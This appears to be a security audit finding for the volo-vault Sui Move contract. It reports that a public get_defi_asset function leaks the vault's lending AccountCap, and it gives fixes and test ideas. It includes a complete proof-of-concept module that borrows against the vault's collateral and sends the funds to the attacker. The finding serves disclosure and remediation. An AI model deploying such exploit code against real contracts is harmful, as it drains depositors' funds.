### Title
Unauthorized Lending Operations via Public AccountCap Reference Bypass Vault Operation Gating

### Summary
The vault's `get_defi_asset` function is public and has no access control checks, allowing anyone to obtain a reference to the vault's `AccountCap` (Navi lending position) when the vault is in NORMAL status. This reference can be used with public `incentive_v3` lending functions to perform unauthorized borrow/withdraw operations, completely bypassing the vault's operation status gating, OperatorCap authorization, and loss tolerance mechanisms.

### Finding Description

**Root Cause:**

The `get_defi_asset` function in the vault contract is publicly accessible without any authorization or status checks: [1](#0-0) 

This function simply returns a reference to any asset stored in the vault's `assets` Bag, including the critical `NaviAccountCap` (aliased from `lending_core::account::AccountCap`), which represents the vault's lending protocol position. [2](#0-1) 

**Why Protections Fail:**

The intended operation flow requires:
1. Calling `start_op_with_bag` which checks vault status, requires OperatorCap, and borrows the AccountCap [3](#0-2) 

2. The AccountCap is removed from vault's assets and placed in a temporary bag [4](#0-3) 

3. After operations, `end_op_with_bag` returns the AccountCap and enables value update checks [5](#0-4) 

However, `get_defi_asset` bypasses all these checks. When the vault is in NORMAL status (not during an operation), the AccountCap remains in the vault's assets bag and can be accessed by anyone via `get_defi_asset`.

**Exploitation Path:**

The `incentive_v3` module provides PUBLIC (not entry, but callable from any module) functions that accept an `AccountCap` reference: [6](#0-5) [7](#0-6) 

These functions use the AccountCap's owner address to perform lending operations on behalf of the vault: [8](#0-7) 

The debt is recorded against the vault's account, but the borrowed balance is returned to the caller.

### Impact Explanation

**Direct Fund Impact:**
- Attacker can borrow funds from the lending protocol using the vault's collateral position
- The borrowed `Balance<CoinType>` is returned to the attacker, who can convert it to `Coin` and transfer to themselves
- The vault's debt increases without corresponding asset acquisition or proper accounting
- Vault depositors suffer losses as the vault's net position value decreases

**Security Integrity Bypass:**
- Completely bypasses OperatorCap authorization requirement
- Bypasses vault status gating (NORMAL vs DURING_OPERATION)
- Bypasses loss tolerance checks that occur in `end_op_value_update_with_bag`
- Bypasses value update and health factor validation flows

**Quantified Impact:**
- An attacker can borrow up to the vault's available credit limit in the lending protocol
- If the vault has $1M in collateral with 75% LTV, an attacker could borrow ~$750K worth of assets
- This could push the vault's health factor below liquidation threshold, causing total loss of collateral
- All vault depositors' shares would lose value proportional to the stolen/lost amount

### Likelihood Explanation

**Attacker Capabilities:**
- Must deploy a custom Move module (cannot use PTB due to public but non-entry functions)
- Requires no special privileges or capabilities
- All required objects (Vault, Storage, Pool, Incentive, Oracle, Clock) are shared and publicly accessible

**Attack Complexity:**
- LOW - Simple module with ~10 lines of code can execute the attack
- No timing constraints or race conditions required
- Attack works whenever vault is in NORMAL status (majority of time)

**Feasibility Conditions:**
- Vault must be in NORMAL status (not during an active operation)
- AccountCap must be in vault's assets bag (true when not in operation)
- Lending protocol must have available liquidity to borrow

**Economic Rationality:**
- Module deployment cost: negligible (one-time ~0.1-1 SUI)
- Potential profit: up to vault's entire lending credit limit
- Attack cost << potential profit, making it highly economically rational

**Detection/Operational Constraints:**
- Attack leaves clear on-chain trail (unusual borrow transactions)
- However, damage is instant and irreversible
- No time for intervention before funds are stolen

### Recommendation

**Immediate Fix:**

Add access control to `get_defi_asset` function. Restrict it to package-only visibility or add authorization checks:

```move
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.check_version();
    self.assert_during_operation(); // Only allow during operations
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**Alternative Approach:**

Create a separate read-only function for value calculations and make `get_defi_asset` package-private:

```move
// For internal use only
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}

// For value calculations only - returns immutable reference
public fun get_defi_asset_for_valuation<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.check_version();
    // Can only be used for read operations
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**Invariant Checks:**
- Add assertion that all lending operations using vault's AccountCap must occur within an active operation (DURING_OPERATION status)
- Add tracking of AccountCap usage to detect unauthorized access patterns

**Test Cases:**
1. Test that `get_defi_asset` cannot be called when vault is in NORMAL status
2. Test that attempting to use AccountCap reference outside operation flow fails
3. Test that only OperatorCap holders can initiate operations that use AccountCap
4. Regression test: ensure legitimate operation flows still work correctly

### Proof of Concept

**Required Initial State:**
- Vault deployed with NaviAccountCap stored at index 0
- Vault has collateral deposited in Navi lending protocol
- Vault in NORMAL status (not during operation)
- Lending protocol has available liquidity

**Attack Module:**
```move
module attacker::exploit {
    use volo_vault::vault::Vault;
    use lending_core::account::AccountCap;
    use lending_core::incentive_v3;
    use lending_core::storage::Storage;
    use lending_core::pool::Pool;
    use lending_core::incentive_v2::Incentive as IncentiveV2;
    use lending_core::incentive_v3::Incentive as IncentiveV3;
    use oracle::oracle::PriceOracle;
    use sui::clock::Clock;
    use sui::coin;
    use sui::transfer;
    use sui::tx_context::TxContext;
    
    public entry fun exploit<T, CoinType>(
        vault: &Vault<T>,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut IncentiveV3,
        oracle: &PriceOracle,
        clock: &Clock,
        asset_id: u8,
        amount: u64,
        ctx: &mut TxContext
    ) {
        // Step 1: Get AccountCap reference from vault (NO CHECKS!)
        let account_cap = vault.get_defi_asset<T, AccountCap>(
            vault_utils::parse_key<AccountCap>(0)
        );
        
        // Step 2: Borrow funds using vault's AccountCap
        let borrowed_balance = incentive_v3::borrow_with_account_cap<CoinType>(
            clock,
            oracle,
            storage,
            pool,
            asset_id,
            amount,
            incentive_v2,
            incentive_v3,
            account_cap
        );
        
        // Step 3: Convert to coin and steal
        let stolen_coin = coin::from_balance(borrowed_balance, ctx);
        transfer::public_transfer(stolen_coin, tx_context::sender(ctx));
        
        // Vault now has increased debt, attacker has the funds
        // All done without OperatorCap, without operation status checks,
        // without loss tolerance validation
    }
}
```

**Expected vs Actual Result:**
- **Expected:** Transaction should fail due to unauthorized access to AccountCap or missing OperatorCap
- **Actual:** Transaction succeeds, funds are borrowed and transferred to attacker, vault's debt increases

**Success Condition:**
- Attacker receives borrowed funds in their wallet
- Vault's lending position shows increased debt without corresponding operation in vault's accounting
- Vault's total USD value decreases by borrowed amount
- Loss tolerance checks were never triggered

### Citations

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/account.move (L8-11)
```text
    struct AccountCap has key, store {
        id: UID,
        owner: address
    }
```

**File:** volo-vault/sources/operation.move (L68-76)
```text
public(package) fun pre_vault_check<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    ctx: &TxContext,
) {
    // vault.assert_enabled();
    vault.assert_normal();
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
    vault.try_reset_tolerance(false, ctx);
}
```

**File:** volo-vault/sources/operation.move (L118-124)
```text
        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = vault.borrow_defi_asset<T, NaviAccountCap>(
                vault_utils::parse_key<NaviAccountCap>(defi_asset_id),
            );
            defi_assets.add<String, NaviAccountCap>(navi_asset_type, navi_account_cap);
        };
```

**File:** volo-vault/sources/operation.move (L235-239)
```text
        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = defi_assets.remove<String, NaviAccountCap>(navi_asset_type);
            vault.return_defi_asset(navi_asset_type, navi_account_cap);
        };
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L853-869)
```text
    public fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        lending::withdraw_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount, account_cap)
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L923-945)
```text
    public fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap,
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        let fee = get_borrow_fee(incentive_v3, amount);

        let _balance = lending::borrow_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount + fee, account_cap);

        deposit_borrow_fee(incentive_v3, &mut _balance, fee);

        _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L506-516)
```text
    public(friend) fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        base_borrow(clock, oracle, storage, pool, asset, amount, account::account_owner(account_cap))
    }
```
